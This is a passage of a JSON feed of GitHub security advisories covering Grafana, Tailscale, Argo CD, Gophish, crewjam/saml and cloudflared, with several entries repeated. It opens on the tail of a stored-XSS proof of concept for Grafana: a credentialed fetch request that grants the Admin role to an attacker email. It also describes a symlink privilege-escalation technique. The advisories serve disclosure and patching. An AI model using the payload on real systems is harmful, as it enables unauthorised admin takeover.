\"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n</code></pre>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>The vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx</p>\n<pre><code class=\"language-typescript\">const FunctionDescription = React.lazy(async () =&gt; {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;\n    },\n  };\n});\n</code></pre>\n<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc\">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6\">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a\">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>\n<li><a href=\"https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a\">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76",
            "title": "[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip",
            "date_modified": "2023-03-23T20:10:48.000Z",
            "date_published": "2023-03-23T20:10:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qrrg-gw7w-vp76"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-23T20:10:28.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-23T20:10:28.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"duplicate-advisory\">Duplicate Advisory</h2>\n<p>This advisory has been withdrawn because it is a duplicate of <a href=\"https://github.com/advisories/GHSA-qrrg-gw7w-vp76\">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>\n<h2 id=\"original-description\">Original Description</h2>\n<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76\">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-1410\">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>\n<li><a href=\"https://grafana.com/security/security-advisories/cve-2023-1410/\">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3cgw-hfw7-wc7j\">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j",
            "title": "[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability",
            "date_modified": "2023-03-23T20:10:28.000Z",
            "date_published": "2023-03-23T09:30:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.</p>\n<p><strong>Affected platforms</strong>: FreeBSD</p>\n<p><strong>Patched Tailscale client versions</strong>: v1.38.2 or later</p>\n<h3 id=\"what-happened\">What happened?</h3>\n<p>A difference in the behavior of the FreeBSD <code>setgroups</code> system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.</p>\n<h3 id=\"who-is-affected\">Who is affected?</h3>\n<p>9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.</p>\n<p>We have notified the affected organizations where we have <a href=\"https://tailscale.com/kb/1224/contact-preferences/#setting-the-security-issues-email\">security contacts</a>.</p>\n<h3 id=\"what-is-the-impact\">What is the impact?</h3>\n<p>Tailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:</p>\n<ul>\n<li>The destination node was a FreeBSD device with Tailscale SSH enabled;</li>\n<li>Tailscale SSH access rules permitted access for non-root users; and</li>\n<li>A non-interactive SSH session was used.</li>\n</ul>\n<h3 id=\"what-do-i-need-to-do\">What do I need to do?</h3>\n<p>If you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view <a href=\"https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd\">FreeBSD nodes with unpatched versions</a> in the admin console.</p>\n<p>To update the local ports tree in advance of what's available upstream, you can:</p>\n<ol>\n<li><code>cd /usr/ports/security/tailscale</code></li>\n<li>edit the Makefile to set <code>PORTVERSION</code> to <code>1.38.2</code></li>\n<li><code>make makesum</code></li>\n<li><code>make install</code></li>\n</ol>\n<p>Tailscale SSH on other platforms is not affected.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>We would like to thank <a href=\"https://www.linkedin.com/in/rbelgrave/\">Ryan Belgrave</a> for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://tailscale.com/security-bulletins/#ts-2023-003\">TS-2023-003</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tailscale/tailscale/security/advisories/GHSA-vfgq-g5x8-g595\">https://github.com/tailscale/tailscale/security/advisories/GHSA-vfgq-g5x8-g595</a></li>\n<li><a href=\"https://github.com/tailscale/tailscale/commit/d00c046b723dff6e3775d7d35f891403ac21a47d\">https://github.com/tailscale/tailscale/commit/d00c046b723dff6e3775d7d35f891403ac21a47d</a></li>\n<li><a href=\"https://github.com/tailscale/tailscale/releases/tag/v1.38.2\">https://github.com/tailscale/tailscale/releases/tag/v1.38.2</a></li>\n<li><a href=\"https://tailscale.com/security-bulletins/#ts-2023-003\">https://tailscale.com/security-bulletins/#ts-2023-003</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28436\">https://nvd.nist.gov/vuln/detail/CVE-2023-28436</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vfgq-g5x8-g595\">https://github.com/advisories/GHSA-vfgq-g5x8-g595</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vfgq-g5x8-g595",
            "title": "[tailscale.com] Non-interactive Tailscale SSH sessions on FreeBSD may use the effective group ID of the tailscaled process",
            "date_modified": "2023-03-23T22:09:22.000Z",
            "date_published": "2023-03-23T19:58:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vfgq-g5x8-g595"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).</p>\n<p>Many Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.</p>\n<p>Note that application resources are not fetched for API calls from <em>unauthenticated</em> users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.</p>\n<p>The patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. <strong>This change in API behavior may impact API clients.</strong> Check your code to make sure it will handle the new API behavior properly.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v2.6.7</li>\n<li>v2.5.16</li>\n<li>v2.4.28</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds besides upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a></li>\n<li>Join us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3\">https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.4.28\">https://github.com/argoproj/argo-cd/releases/tag/v2.4.28</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.5.16\">https://github.com/argoproj/argo-cd/releases/tag/v2.5.16</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.6.7\">https://github.com/argoproj/argo-cd/releases/tag/v2.6.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD authenticated but unauthorized users may enumerate Application names via the API",
            "date_modified": "2023-03-23T19:49:12.000Z",
            "date_published": "2023-03-23T19:49:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).</p>\n<p>Many Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.</p>\n<p>Note that application resources are not fetched for API calls from <em>unauthenticated</em> users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.</p>\n<p>The patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. <strong>This change in API behavior may impact API clients.</strong> Check your code to make sure it will handle the new API behavior properly.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v2.6.7</li>\n<li>v2.5.16</li>\n<li>v2.4.28</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds besides upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a></li>\n<li>Join us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3\">https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.4.28\">https://github.com/argoproj/argo-cd/releases/tag/v2.4.28</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.5.16\">https://github.com/argoproj/argo-cd/releases/tag/v2.5.16</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.6.7\">https://github.com/argoproj/argo-cd/releases/tag/v2.6.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD authenticated but unauthorized users may enumerate Application names via the API",
            "date_modified": "2023-03-23T19:49:12.000Z",
            "date_published": "2023-03-23T19:49:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).</p>\n<p>Many Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.</p>\n<p>Note that application resources are not fetched for API calls from <em>unauthenticated</em> users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.</p>\n<p>The patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. <strong>This change in API behavior may impact API clients.</strong> Check your code to make sure it will handle the new API behavior properly.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v2.6.7</li>\n<li>v2.5.16</li>\n<li>v2.4.28</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds besides upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a></li>\n<li>Join us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3\">https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.4.28\">https://github.com/argoproj/argo-cd/releases/tag/v2.4.28</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.5.16\">https://github.com/argoproj/argo-cd/releases/tag/v2.5.16</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.6.7\">https://github.com/argoproj/argo-cd/releases/tag/v2.6.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq",
            "title": "[github.com/argoproj/argo-cd/v2] Argo CD authenticated but unauthorized users may enumerate Application names via the API",
            "date_modified": "2023-03-23T19:49:12.000Z",
            "date_published": "2023-03-23T19:49:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).</p>\n<p>Many Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.</p>\n<p>Note that application resources are not fetched for API calls from <em>unauthenticated</em> users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.</p>\n<p>The patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. <strong>This change in API behavior may impact API clients.</strong> Check your code to make sure it will handle the new API behavior properly.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>v2.6.7</li>\n<li>v2.5.16</li>\n<li>v2.4.28</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds besides upgrading.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Thank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a>.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/argoproj/argo-cd/issues\">the Argo CD issue tracker</a> or <a href=\"https://github.com/argoproj/argo-cd/discussions\">discussions</a></li>\n<li>Join us on <a href=\"https://argoproj.github.io/community/join-slack\">Slack</a> in channel #argo-cd</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3\">https://github.com/argoproj/argo-cd/commit/3a28c8a18cc2aa84fe81492625545d25c7a90bc3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.4.28\">https://github.com/argoproj/argo-cd/releases/tag/v2.4.28</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.5.16\">https://github.com/argoproj/argo-cd/releases/tag/v2.5.16</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/releases/tag/v2.6.7\">https://github.com/argoproj/argo-cd/releases/tag/v2.6.7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2q5c-qw9c-fmvq\">https://github.com/advisories/GHSA-2q5c-qw9c-fmvq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq",
            "title": "[github.com/argoproj/argo-cd] Argo CD authenticated but unauthorized users may enumerate Application names via the API",
            "date_modified": "2023-03-23T19:49:12.000Z",
            "date_published": "2023-03-23T19:49:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2q5c-qw9c-fmvq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Gophish through 0.12.1 was discovered to contain a cross-site scripting (XSS) vulnerability via a crafted landing page.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-45004\">https://nvd.nist.gov/vuln/detail/CVE-2022-45004</a></li>\n<li><a href=\"https://github.com/gophish/gophish/releases/tag/v0.12.1\">https://github.com/gophish/gophish/releases/tag/v0.12.1</a></li>\n<li><a href=\"https://pastebin.com/z5MD3z8c\">https://pastebin.com/z5MD3z8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-55m9-hm92-xm8j\">https://github.com/advisories/GHSA-55m9-hm92-xm8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-55m9-hm92-xm8j",
            "title": "[github.com/gophish/gophish] Gophish vulnerable to Cross-site Scripting via crafted landing page",
            "date_modified": "2023-03-22T22:22:10.000Z",
            "date_published": "2023-03-22T21:30:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-55m9-hm92-xm8j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Our use of flate.NewReader does not limit the size of the input. The user could pass more than 1 MB of data in the HTTP request to the processing functions, which will be decompressed server-side using the Deflate algorithm. Therefore, after repeating the same request multiple times, it is possible to achieve a reliable crash since the operating system kills the process.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/crewjam/saml/security/advisories/GHSA-5mqj-xc49-246p\">https://github.com/crewjam/saml/security/advisories/GHSA-5mqj-xc49-246p</a></li>\n<li><a href=\"https://github.com/crewjam/saml/commit/8e9236867d176ad6338c870a84e2039aef8a5021\">https://github.com/crewjam/saml/commit/8e9236867d176ad6338c870a84e2039aef8a5021</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28119\">https://nvd.nist.gov/vuln/detail/CVE-2023-28119</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5mqj-xc49-246p\">https://github.com/advisories/GHSA-5mqj-xc49-246p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5mqj-xc49-246p",
            "title": "[github.com/crewjam/saml] crewjam/saml vulnerable to Denial Of Service Via Deflate Decompression Bomb",
            "date_modified": "2023-03-23T07:45:38.000Z",
            "date_published": "2023-03-22T21:23:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5mqj-xc49-246p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A vulnerability has been discovered in cloudflared's installer (&lt;= 2023.3.0) for Windows 32-bits devices that allows a local attacker with no administrative permissions to escalate their privileges on the affected device. This vulnerability exists because the MSI installer used by cloudflared relied on a world-writable directory.</p>\n<p>An attacker with local access to the device (without Administrator rights) can use symbolic links to trick the MSI installer into deleting files in locations that the attacker would otherwise have no access to. By creating a symlink from the world-writable directory to the target file, the attacker can manipulate the MSI installer's repair functionality to delete the target file during the repair process.</p>\n<p>Exploitation of this vulnerability could allow an attacker to delete important system files or replace them with malicious files, potentially leading to the affected device being compromised.</p>\n<p><strong>The cloudflared client itself is not affected by this vulnerability, only the installer for 32-bit Windows devices.</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>A new installer was released as part of version 2023.3.1, corresponding to pseudoversion 0.0.0-20230313153246-f686da832f85 on pkg.go.dev. Users are encouraged to remove old installers from their systems.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/cloudflare/cloudflared/releases\">Cloudflared Releases</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a 